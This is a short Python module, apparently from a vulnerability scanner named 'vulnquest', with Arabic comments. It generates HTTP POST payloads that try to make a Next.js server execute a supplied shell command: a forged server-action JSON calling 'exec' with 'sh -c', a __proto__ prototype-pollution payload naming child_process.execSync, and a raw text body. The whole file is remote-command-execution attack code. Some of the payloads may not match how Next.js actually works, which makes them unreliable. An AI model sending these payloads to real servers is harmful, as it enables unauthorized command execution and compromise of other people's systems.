# models/exploits.py

import json

def generate_rsc_payloads(test_cmd: str):
    """
    توليد قائمة بحمولات استغلال محتملة لأنماط مختلفة من Next.js
    """
    payloads = []

    # النمط 1: serverActions عبر JSON
    payloads.append({
        "payload": json.dumps({
            "id": "vulnquest_test",
            "action": {
                "name": "exec",
                "args": ["sh", "-c", test_cmd]
            }
        }),
        "headers": {
            "Content-Type": "application/json",
            "Next-Action": "1"
        },
        "method": "POST"
    })

    # النمط 2: حقن عبر __proto__ (لتطبيقات ضعيفة)
    proto_payload = {
        "__proto__": {
            "exec": "child_process.execSync",
            "args": [test_cmd]
        }
    }
    payloads.append({
        "payload": json.dumps(proto_payload),
        "headers": {"Content-Type": "application/json"},
        "method": "POST"
    })

    # النمط 3: body عادي (لبعض الإعدادات الخاطئة)
    payloads.append({
        "payload": test_cmd,
        "headers": {"Content-Type": "text/plain"},
        "method": "POST"
    })

    return payloads